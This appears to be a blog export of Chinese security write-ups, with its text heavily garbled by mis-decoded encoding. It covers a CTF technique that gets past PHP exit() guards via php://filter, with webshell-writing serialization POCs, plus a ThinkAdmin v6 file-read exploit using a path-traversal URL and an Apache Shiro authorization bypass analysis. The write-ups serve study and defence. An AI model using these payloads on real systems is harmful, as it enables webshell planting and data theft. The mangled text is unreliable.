æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•çš„å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚ 123&lt;?php$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);base64_decode($_GET['txt']); æ‰€ä»¥ï¼Œå½“ $a è¢«åŠ ä¸Š &lt;?php die(\"nononon\");?&gt; ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥å¯¹å…¶è¿›è¡Œè§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦ &lt;ã€?ã€(ã€)ã€;ã€&gt; ç©ºæ ¼ ç­‰ä¸ç¬¦åˆ base64 ç¼–ç çš„å­—ç¬¦èŒƒå›´çš„å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰ phpdienononon å’Œå…¶ä»–ä¼ å…¥çš„å­—ç¬¦ã€‚phpdienononon ä¸€å…±æ˜¯13ä¸ªå­—ç¬¦ï¼Œå› ä¸º base64 ç®—æ³•è§£ç æ˜¯4ä¸ª byte ä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ ä¸‰ä¸ª a ä¸€å…±åå…­ä¸ªå­—ç¬¦ï¼Œè¿™æ ·å‰é¢çš„å­—ç¬¦ä¸²ä¼šè¢«æ­£å¸¸çš„è§£æï¼Œåé¢æˆ‘ä»¬ä¼ å…¥çš„ webshell çš„ base64 ä¹Ÿä¼šè¢«æ­£å¸¸çš„è§£ç ã€‚ç»“æœå°±æ˜¯ &lt;?php die(\"nononon\");?&gt; æ²¡æœ‰äº†ã€‚POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=convert.base64-decode/resource=cccc.php'; public $text= 'aaaPD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³• &lt;?php die(\"nononon\");?&gt; æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª XML æ ‡ç­¾ï¼Œå¯ä»¥åˆ©ç”¨ strip_tags å‡½æ•°å»é™¤ï¼Œ php://filter ä¹Ÿæ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚php://filter/write=strip_tagsä½†æ˜¯æŠŠåŸæœ¬å­˜åœ¨çš„ &lt;?php die(\"nononon\");?&gt; å»é™¤ä¹‹åï¼Œæˆ‘ä»¬å†å†™å…¥ webshell ä¹Ÿä¼šè¢«åˆ é™¤ã€‚ php://filter æ˜¯å…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°† webshell è¿›è¡Œ base64 ç¼–ç ã€‚åœ¨è°ƒç”¨ strip_tags ä¹‹åå†è¿›è¡Œ base64-decodeã€‚ POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=dddd.php'; public $text= 'PD9waHAgcGhwaW5mbygpOyA/Pg==';}$data = new Yongen();print(serialize($data));?&gt; rot13ç¼–ç  &lt;?php exit; ?&gt; åœ¨ç»è¿‡ rot13 ç¼–ç ä¹‹åä¼šå˜æˆ &lt;?cuc rkvg; ?&gt;&lt;?cuc qvr(\"abababa\");?&gt; åœ¨ç»è¿‡ rot13 ç¼–ç ä¹‹åä¼šå˜æˆ &lt;?cuc qvr(\"abababa\");?&gt;åœ¨ php ä¸å¼€å¯ short_open_tag çŸ­æ ‡ç­¾æ—¶ï¼Œphp æ— æ³•è¯†åˆ«è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ POC 12345678&lt;?phpclass Yongen{ public $file = 'php://filter/write=string.rot13/resource=eeee.php'; public $text= '&lt;?cuc cucvasb(); ?&gt;';}$data = new Yongen();print(serialize($data));?&gt; CTF ä¾‹é¢˜äºŒ å…³äºè·³å‡ºæ­»äº¡ exit() è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„ä¾‹å­ã€‚ 1234567891011121314151617&lt;?php show_source('index.php'); function getKey($path){ $name = $path.md5($_SERVER[\"REMOTE_ADDR\"]).'.php'; return $name; } echo $_SERVER[\"REMOTE_ADDR\"]; $expire = $_POST['expire']; $path = $_POST['path']; $filename = getKey($path); $value = $filename; $data = serialize($value); $data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data; $result = file_put_contents($filename, $data);?&gt; æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å…³é”®çš„éƒ¨åˆ†ä½äº 12$data = \"&lt;?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?&gt;\\n\" . $data;$result = file_put_contents($filename, $data); sprintf('%012d', $expire)ï¼Œä¼šè¿”å›12ä½çš„æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ exit();?&gt; æ‹¼æ¥å½¢æˆä¸€æ®µ php ä»£ç ã€‚ ç”±äº exit çš„å­˜åœ¨ï¼Œæ­£å¸¸æƒ…å†µä¸‹ç¨‹åºä¸ä¼šæ‰§è¡Œåˆ° exit() åé¢çš„å†…å®¹ã€‚è¦æƒ³åŠæ³•è·³å‡ºæ­»äº¡ exit()ã€‚ POST path=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet å‚è€ƒæ–‡ç«  å…³äºfile_put_contentsçš„ä¸€äº›å°æµ‹è¯•file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜æ¢ç´¢php://filteråœ¨å®æˆ˜å½“ä¸­çš„å¥‡æŠ€æ·«å·§ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Thinkadmin v6ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´(CVE-2020-25540)","slug":"Thinkadmin v6ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´(CVE-2020-25540)","date":"2020-09-27T08:46:41.000Z","updated":"2020-10-12T06:10:55.189Z","comments":true,"path":"2020/09/27/Thinkadmin v6ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´(CVE-2020-25540)/","link":"","permalink":"http://yoursite.com/2020/09/27/Thinkadmin%20v6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2020-25540)/","excerpt":"ç¯å¢ƒæ­å»º ä¸‹è½½ ThinkAdmin çš„è¿‡å»ç‰ˆæœ¬","text":"ç¯å¢ƒæ­å»º ä¸‹è½½ ThinkAdmin çš„è¿‡å»ç‰ˆæœ¬ é€šè¿‡ Commit æ‰¾åˆ°ä¿®å¤çš„ä½ç½®ï¼Œä¸‹è½½ä¿®å¤ç‰ˆæœ¬çš„å‰ä¸€ä¸ªç‰ˆæœ¬å¯ä»¥é€šè¿‡å¯¹æ¯”ï¼Œé‡ç‚¹å…³æ³¨ä¿®å¤çš„ç›¸å…³ä¿¡æ¯ã€‚å¯ä»¥æ³¨æ„åˆ°å¯¹äºä»»æ„æ–‡ä»¶è¯»å–çš„é˜²æŠ¤ä»…ä»…æ˜¯åŠ äº† ç¦æ­¢ç›®å½•çº§åˆ«ä¸Šè·³ ä¸‹è½½è€ç‰ˆæœ¬çš„æ–¹æ³•ä¸ºï¼Œæ‰¾åˆ°ä¿®æ”¹å‰çš„ Commit ç‚¹å‡» Browse files å°±å¯ä»¥ä¸‹è½½è¿‡å»çš„ç‰ˆæœ¬äº†ã€‚ æŒ‰ç…§é…ç½®åˆ›å»ºå’Œå¯¼å…¥æ•°æ®åº“ï¼Œå°±å®‰è£…æˆåŠŸäº†ã€‚ æ¼æ´åˆ©ç”¨ è·å–ç‰ˆæœ¬ä¿¡æ¯ http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/version è¯»å–ç½‘ç«™ç›®å½• http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/nodePOST rules=[\"/\"] POST rules=[\"../\"] ä»»æ„æ–‡ä»¶è¯»å– 12345678910&lt;?phpfunction encode($content){ [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))]; for ($i = 0; $i &lt; $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0); return $chars;}var_dump(encode(\"public/static/../../poc.php\"));?&gt; http://thinkadmin.test/index.php/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b34332r1a342w34 æ¼æ´åˆ†æ æˆ‘ä¸‹è½½çš„ç‰ˆæœ¬ä¸ºæ¼æ´ä¿®å¤å‰çš„ç‰ˆæœ¬ï¼Œå¯èƒ½ä¸ç½‘ä¸Šçš„æ–‡ç« æœ‰äº›ä¸åŒï¼Œä¸è¿‡å¤§ä½“ä¸Šæ˜¯ç›¸åŒçš„ã€‚ app/admin/controller/api/Update.php ä¸­å¼•ç”¨äº†ä¸¤ä¸ª function å¯ä¸é€šè¿‡ç™»å½•è®¤è¯å°±å¯ä½¿ç”¨ã€‚ \\app\\admin\\controller\\api\\Update::version å¯ä»¥è·å–åˆ°å½“å‰ç‰ˆæœ¬ ç›®å½•ç©¿è¶Š \\app\\admin\\controller\\api\\Update::node å°† POST ä¼ å…¥çš„å‚æ•° rules &amp; ignore ä¼ é€’ç»™ ModuleService::instance()-&gt;getChanges()è·Ÿè¿›å‡½æ•° \\think\\admin\\service\\ModuleService::getChanges åœ¨ getChanges() å‡½æ•°å†…ï¼Œéå†ä¼ è¿›çš„ $rules æ•°ç»„ï¼Œå°†å‚æ•°è¿›è¡Œè½¬æ¢ï¼Œå¹¶ä¸ç½‘ç«™æ ¹ç›®å½•è¿›è¡Œè·¯å¾„æ‹¼æ¥ï¼Œä¼ é€’ç»™ _scanLocalFileHashList ï¼Œè¿”å›æ–‡ä»¶åä¸å“ˆå¸Œå€¼ã€‚ \\think\\admin\\service\\ModuleService::_scanLocalFileHashList åœ¨ _scanLocalFileHashList ä¸­ï¼Œé€šè¿‡ scanDirectory éå†ä¼ è¿‡æ¥ç›®å½•ä¸‹çš„æ–‡ä»¶\\think\\admin\\service\\NodeService::scanDirectory å¦‚æ­¤ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹å®ç°è¯»å–ç½‘ç«™çš„æ–‡ä»¶åˆ—è¡¨ã€‚ ç›®å‰é‡‡ç”¨çš„ä¿®å¤æ–¹æ³•æ˜¯ï¼Œåœ¨è¯»å–å®Œæ–‡ä»¶ä¹‹åï¼Œå¯¹è·¯å¾„è¿›è¡Œä¸€ä¸ªåˆ¤æ–­ï¼Œçœ‹æ˜¯å¦ç¬¦åˆ checkAllowDownload å†è¿”å›æ•°æ®ã€‚ ä»»æ„æ–‡ä»¶è¯»å– \\app\\admin\\controller\\api\\Update::get é¦–å…ˆä» GETè¯»å– encode å‚æ•°å¹¶ä½¿ç”¨ decode() è§£ç \\decode å¯¹åº”çš„åŠ å¯†å‡½æ•° encode()\\encode è·Ÿè¿›å‡½æ•° checkAllowDownload å¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œåˆ¤æ–­\\think\\admin\\service\\ModuleService::checkAllowDownload ç„¶åè·Ÿè¿›ç™½åå•åˆ¤æ–­å‡½æ•° _getAllowDownloadRule()\\think\\admin\\service\\ModuleService::_getAllowDownloadRule è¢«å…è®¸çš„åˆ—è¡¨ 123456config public/static public/router.php public/index.php app/admin app/wechat ä¹Ÿå°±æ˜¯è¯´ $name çš„ä¸èƒ½ä¸º databases.php å¹¶ä¸”å¿…é¡»è¦å†å…è®¸åˆ—è¡¨å†…çš„ã€‚å¯ä»¥é€šè¿‡ public/static/../../poc.php æ¥è¯»å–ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ poc.php é’ˆå¯¹ database.php çš„é™åˆ¶ï¼Œåœ¨ Windows ä¸‹å¯ä»¥é€šè¿‡ \" æ¥è¿›è¡Œç»•è¿‡ã€‚public/static/../../config/database\"phpemmmï¼Œä½†æ˜¯æˆ‘æ˜¯æ²¡æœ‰è¯»å–å‡ºæ¥ã€‚ äº‹å®ä¸Šï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•æ˜¯å¯ä»¥è¯»å–æ–‡ä»¶çš„ ç›®å‰é‡‡ç”¨çš„ä¿®å¤æ–¹æ³•è¿˜æ˜¯æ·»åŠ äº† 1234// ç¦æ­¢ç›®å½•çº§åˆ«ä¸Šè·³ if (stripos($name, '..') !== false) { return false; } æ€è€ƒ æˆ‘æƒ³è¿™ä¸ªä¿®å¤æ–¹æ³•è¿˜æ˜¯å­˜åœ¨é—®é¢˜çš„ï¼Œé¦–å…ˆæ˜¯å¯¹è¿™äº›æ–‡ä»¶æƒé™é…ç½®çš„é—®é¢˜ï¼Œæ ¹æœ¬æ²¡æœ‰ä¿®å¤å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œå†æœªç™»å½•çš„æƒ…å†µä¸‹ï¼Œä»ç„¶èƒ½å®ç°å¯¹æ–‡ä»¶çš„è®¿é—®ã€‚å…¶å®æ˜¯ä¿®å¤è¿‡æ»¤çš„é—®é¢˜ï¼Œè™½ç„¶é‡‡ç”¨äº†å¢åŠ é»‘åå•çš„æ¨¡å¼ï¼Œä½†æ˜¯ï¼Œè¿˜æ˜¯èƒ½ç›´æ¥è·å–å¾—åˆ°ç½‘ç«™çš„æ–‡ä»¶åˆ—è¡¨ã€‚ ä¿®å¤åè¿˜æ˜¯é¦–å…ˆå¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œä¸€ä¸ªæŸ¥è¯¢ï¼Œå¾—å‡ºæ‰€æœ‰çš„æ–‡ä»¶çš„è·¯å¾„ï¼Œç„¶åå°†è·å–å¾—åˆ°æ–‡ä»¶çš„è·¯å¾„è¿›è¡Œåˆ¤æ–­ï¼Œå¹¶ä¸æ˜¯ç›´æ¥å¯¹ä¼ å…¥çš„è·¯å¾„è¿›è¡Œåˆ¤æ–­ã€‚å¯èƒ½æ¯”è¾ƒæ‹—å£ï¼Œä½†æ˜¯è¿™æ ·è¯´ï¼Œå¤§æ¦‚å°±èƒ½æ¸…æ¥šã€‚æˆ‘ä»¬é¦–å…ˆä¼ å…¥ / ï¼Œç„¶åä¼šè·å–å¾—åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„è·¯å¾„åï¼Œlike app/admin/controller/Auth.php ç„¶åè¿™äº›å€¼å°±ä¼šè¿›è¡ŒcheckAllowDownload çš„æ£€éªŒã€‚ ç„¶åç™½åå•ä¸ºæ‰€ä»¥è¿˜æ˜¯å¯ä»¥åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„ä¸€äº›æ–‡ä»¶æ»´ã€‚ç›®å‰çš„è¿‡æ»¤çš„ .. æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥ç»•è¿‡ã€‚ä½†æ˜¯æ¼æ´çš„ä½ç½®è¿˜æ˜¯å­˜åœ¨ï¼Œå¦‚æœç‰¹æ®Šæƒ…å†µå¯ä»¥ç»•è¿‡ .. çš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚ å‚è€ƒæ–‡ç«  ThinkAdmin v6 æœªæˆæƒåˆ—ç›®å½•/ä»»æ„æ–‡ä»¶è¯»å– document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro æƒé™ç»•è¿‡æ¼æ´(CVE-2020-13933)","slug":"Apache Shiro æƒé™ç»•è¿‡æ¼æ´(CVE-2020-13933)","date":"2020-09-23T02:27:47.000Z","updated":"2020-10-12T06:10:55.187Z","comments":true,"path":"2020/09/23/Apache Shiro æƒé™ç»•è¿‡æ¼æ´(CVE-2020-13933)/","link":"","permalink":"http://yoursite.com/2020/09/23/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-13933)/","excerpt":"å‰è¨€ ä¹‹å‰åˆ†æäº† Apache Shiro æƒé™ç»•è¿‡æ¼æ´(CVE-2020-11989)ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´åˆå‡ºç°äº†æ–°çš„æƒé™ç»•è¿‡æ¼æ´ (CVE-2020-13933)ã€‚åº”è¯¥æ˜¯åœ¨ä¿®å¤çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ç»•è¿‡ã€‚ CVE-2020-11989 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.5.3 , CVE-2020-13933 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.6.0 ã€‚","text":"å‰è¨€ ä¹‹å‰åˆ†æäº† Apache Shiro æƒé™ç»•è¿‡æ¼æ´(CVE-2020-11989)ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´åˆå‡ºç°äº†æ–°çš„æƒé™ç»•è¿‡æ¼æ´ (CVE-2020-13933)ã€‚åº”è¯¥æ˜¯åœ¨ä¿®å¤çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ç»•è¿‡ã€‚ CVE-2020-11989 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.5.3 , CVE-2020-13933 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.6.0 ã€‚ åœ¨è¿™ä¸ªåœ°æ–¹ Shiro å¯¹ url çš„å¤„ç†æ˜¯é€ æˆ CVE-2020-11989 çš„åŸå› ä¹‹ä¸€ï¼ŒApache Shiro 1.5.3 å¯¹æ­¤è¿›è¡Œçš„ä¿®å¤ã€‚ ç„¶åæˆ‘ä»¬æŸ¥çœ‹æœ€æ–°ç‰ˆçš„ Apache Shiro 1.6.0 å‘ç°åœ¨ web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java å¢åŠ äº†ä»å…¨å±€ä¸Šå¯¹åˆ†å·ï¼Œåæ–œæ å’ŒéASCIIå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ ç¯å¢ƒæ­å»º è¿˜æ˜¯é€‰æ‹© https://github.com/l3yx/springboot-shiro é¡¹ç›®è¿›è¡Œæµ‹è¯•ä¸‹è½½å®Œæˆåä¿®æ”¹ä¸€ä¸‹ pom.xml ä¸­ org.apache.shiro æ‰€å¯¹åº”çš„ç‰ˆæœ¬å· ä¸º 1.5.3 ï¼ŒåŒæ—¶å°† LoginController ä¸­ä¿®æ”¹ä¸º 1234@GetMapping(\"/admin/{name}\") public String admin(@PathVariable String name) { return \"admin page,hello \" + name; } åŸå› ä¹‹åæè¿°ï¼ŒåŒæ—¶ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶åœ¨ pom.xml æ–‡ä»¶ä¸­åŠ å…¥ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.5.3&lt;/version&gt;&lt;/dependency&gt; ç”Ÿæˆ war åŒ…ï¼Œéƒ¨ç½²äºTomcat ä¿®æ”¹ \\apache-tomcat-8.0.52\\bin\\catalina.bat æ–‡ä»¶ 123if not \"%JPDA_ADDRESS%\" == \"\" goto gotJpdaAddressset JPDA_ADDRESS=127.0.0.1:5005:gotJpdaAddress catalina.bat jpda start å¯åŠ¨ ï¼Œé…ç½® idea ä¸­çš„è¿œç¨‹è°ƒè¯• æ¼æ´åˆ†æ Shiro å±‚ Tomcat ç±»ä¸­çš„ org.apache.catalina.core.ApplicationFilterChain æ˜¯ç”¨äºç®¡ç†é’ˆå¯¹è¯·æ±‚ request çš„è¿‡æ»¤å™¨ã€‚ Tomcat çš„ç±» ApplicationFilterChain æ˜¯ä¸€ä¸ª Java Servlet APIè§„èŒƒ javax.servlet.FilterChain çš„å®ç°ï¼Œç”¨äºç®¡ç†æŸä¸ªè¯·æ±‚ request çš„ä¸€ç»„è¿‡æ»¤å™¨ Filter çš„æ‰§è¡Œã€‚å½“é’ˆå¯¹ä¸€ä¸ª reques æ‰€å®šä¹‰çš„ä¸€ç»„è¿‡æ»¤å™¨ Filter å¤„ç†å®Œè¯¥è¯·æ±‚åï¼Œç»„åä¸€ä¸ª doFilter() è°ƒç”¨æ‰ä¼šæ‰§è¡Œç›®æ ‡ Servlet çš„æ–¹æ³• service(),ç„¶åå“åº”å¯¹è±¡ response ä¼šæŒ‰ç…§ç›¸åçš„é¡ºåºä¾æ¬¡è¢«è¿™äº›Filterå¤„ç†ï¼Œæœ€ç»ˆåˆ°è¾¾å®¢æˆ·ç«¯ã€‚ æ ¹æ®è°ƒè¯•æ—¶æ˜¾ç¤ºå‡ºçš„è°ƒç”¨é“¾ï¼Œå¯ä»¥çœ‹åˆ°å…ˆæ‰§è¡Œåˆ°äº† shiro ä¸­çš„ OncePerRequestFilter è¿™ä¸ªç±» åœ¨ shiro ä¸­ org.springframework.web.filter.OncePerRequestFilter è¿™ä¸ªç±»æ˜¯å…¶ä»–çš„æ‰€æœ‰ filter çš„çˆ¶ç±»ï¼Œæ‰€æœ‰çš„ filter çš„ doFilter æ–¹æ³•éƒ½æ˜¯è°ƒç”¨çš„è¿™ä¸ªç±»ä¸­çš„ doFIlter æ–¹æ³•ã€‚ é¦–å…ˆè°ƒç”¨ getAlreadyFilteredAttributeName() ä¸ºè¿‡æ»¤å™¨æ ‡è®°ï¼Œç„¶ååˆ¤æ–­è¿‡æ»¤å™¨æ˜¯å¦å·²ç»è°ƒç”¨è¿‡ï¼Œæ˜¯å¦æœªä¸ºå½“å‰è¯·æ±‚å¯ç”¨ã€‚org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter ç„¶åè°ƒç”¨ doFilterInternal æ–¹æ³•ï¼Œè·Ÿè¿›åå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„æ˜¯ public abstract class AbstractShiroFilter extends OncePerRequestFilter ä¸­çš„ doFilterInternal æ–¹æ³•org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal è·Ÿè¿›å‡½æ•° executeChainorg.apache.shiro.web.servlet.AbstractShiroFilter#executeChain è·Ÿè¿›å‡½æ•° getExecutionChainorg.apache.shiro.web.servlet.AbstractShiroFilter#getExecutionChain è·Ÿè¿›å…¶ä¸­çš„ getChainorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain è·Ÿè¿›æ–¹æ³• getPathWithinApplicationorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication WebUtils#getPathWithinApplication ä¿®å¤äº†ä¹‹å‰ shiro 1.5.2 æ‰€å­˜åœ¨çš„ url åŒç¼–ç ç»•è¿‡é—®é¢˜ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æœ€åçš„è¿”å›å€¼æ˜¯ /admin/ org.apache.shiro.web.util.WebUtils#getPathWithinApplication org.apache.shiro.web.util.WebUtils#getServletPath è¿”å›å€¼ä¸º /admin/;whippet org.apache.shiro.web.util.WebUtils#getPathInfo è¿”å› \"\" org.apache.shiro.web.util.WebUtils#removeSemicolon å°† ; åŠå…¶ä¹‹åçš„å…¨éƒ¨åˆ é™¤ å›åˆ°å‡½æ•° org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain ç»§ç»­å‘ä¸‹æ‰§è¡Œå¦‚æœè¯·æ±‚çš„ä¸æ˜¯ /ï¼Œå°±å»é™¤æœ«å°¾çš„ / ï¼Œè¿”å›å€¼å°±æ˜¯ /admin private static final String DEFAULT_PATH_SEPARATOR = \"/\"; æ¥ç€æ ¹æ® filterChainManager.getChainNames() è·å–çš„æ‹¦æˆªå™¨è¿›è¡ŒåŒ¹é… org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches org.apache.shiro.util.AntPathMatcher#matchesorg.apache.shiro.util.AntPathMatcher#matchorg.apache.shiro.util.AntPathMatcher#doMatchpattDirs çš„æœ€åä¸€ä½æ˜¯ * æ‰€ä»¥ä¼šè¿”å› false æ²¡æœ‰åŒ¹é…åˆ°ä¼šè¿”å› null åŒ¹é…åˆ°çš„è¯ä¼šæŒ‡å‘ ProxiedFilterChain 1.è·¯å¾„åŒ¹é…ï¼špathMatches(pathPattern, requestURI)ï¼Œé»˜è®¤çš„Fliteré€ä¸ªä¸è¯·æ±‚URIè¿›è¡ŒåŒ¹é…ï¼›2ã€ä»£ç†FilterChainï¼šProxiedFilterChainã€‚å¦‚æœåŒ¹é…ä¸ä¸Šï¼Œé‚£ä¹ˆç›´æ¥èµ°servletçš„FilterChainï¼Œå¦åˆ™å…ˆèµ°shiroçš„ä»£ç†FilterChainï¼ˆProxiedFilterChainï¼‰ï¼Œä¹‹åå†èµ°servletçš„FilterChain ç»§ç»­å•æ­¥æ‰§è¡Œæœ€åè¿”å› ApplicationFilterChain ç›¸å½“äºå¹¶æ²¡æœ‰æ‰§è¡Œ Filter æ­¤æ—¶å°±ç›¸å½“äºå·²ç»ç»•è¿‡äº† shiro çš„æƒé™éªŒè¯ï¼Œå¯ä»¥ç›´æ¥è®¿é—®åˆ°éœ€è¦æƒé™ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰æ—¶ä¼šè¿”å›è¿™æ ·çš„ç•Œé¢ï¼Œæ˜¯å› ä¸º Spring å¹¶æ²¡æœ‰åŒ¹é…åˆ°ç›¸å¯¹åº”çš„é¡µé¢ã€‚ Springå±‚ chain.doFilter(request, response); æ¥ä¸‹æ¥çš„è°ƒç”¨æ ˆå¦‚å›¾ Spring åœ¨ Tomcat ä¸­è¿è¡Œæ—¶éœ€è¦æä¾›å¯¹ Servlet è§„èŒƒçš„æ”¯æŒï¼Œå› ä¸º Tomcat æ—¶åŸºäº Servlert è§„èŒƒçš„ web å®¹å™¨ã€‚ DispatcherServlet æ˜¯ Servlet è§„èŒƒçš„å…·ä½“å®ç°ã€‚åœ¨ web å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¯åŠ¨ Tomcat å®¹å™¨æ—¶ä¼šæ ¹æ®å…¶ Servlet è§„èŒƒå¯åŠ¨ Spring å®ç°çš„ DispatcherServlet ï¼Œè¿™æ ·å°±é©±åŠ¨äº† Spring çš„è¿è¡Œã€‚ DispatcherServlet åœ¨å°†è¯·æ±‚æ˜ å°„åˆ°å¤„ç†å™¨æ—¶ï¼Œè°ƒç”¨äº† getHandlerorg.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler è·Ÿè¿› getHandlerInternalorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal é€šè¿‡ getLookupPathForRequest è·å–è¯·æ±‚çš„ç»å¯¹è·¯å¾„org.springframework.web.util.UrlPathHelper#getLookupPathForRequest(javax.servlet.http.HttpServletRequest) org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping è·Ÿè¿›å‡½æ•° getPathWithinApplicationorg.springframework.web.util.UrlPathHelper#getPathWithinApplication è·Ÿè¿›å‡½æ•° getRequestUriorg.springframework.web.util.UrlPathHelper#getRequestUri decodeAndCleanUriString å¯¹ url è¿›è¡Œäº†è§£ç å¤„ç†org.springframework.web.util.UrlPathHelper#decodeAndCleanUriStringæ­¤å¤„å­˜åœ¨ä¸€ä¸ªé—®é¢˜,å› ä¸ºåˆ©ç”¨ ; å°±å¯ä»¥ç›´æ¥ç»•è¿‡ shiro çš„æƒé™éªŒè¯ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆåœ¨ç›´æ¥ä½¿ç”¨ ; æ—¶ä¼šè¿”å› 404 é”™è¯¯ï¼Œåœ¨ spring ä¸­ä¸èƒ½æ‰¾åˆ°è¯¥é¡µé¢org.springframework.web.util.UrlPathHelper#decodeAndCleanUriStringdecodeAndCleanUriString ä¼šå…ˆå°† url ä¸­ ; åé¢çš„æ•°æ®è¿›è¡Œåˆ†å‰²ç„¶åå†è¿›è¡Œ url è§£ç è§£å†³äº†è¿™ä¸ªå°å°çš„é—®é¢˜ï¼Œåˆäº§ç”Ÿäº†ä¸€ä¸ªå¤§å¤§çš„ç–‘é—®ï¼Œåœ¨ Apache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989) ä¸€æ–‡ä¸­å¸ˆå‚…æ‰€åˆ©ç”¨çš„ POC ä¸º /;/test/admin/page å¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œä» ; è¿›è¡Œåˆ†å‰²ï¼Œæœ€åå¾—å‡ºæ¥çš„åº”è¯¥æ˜¯ä¸€ç›´å»è¯·æ±‚ / 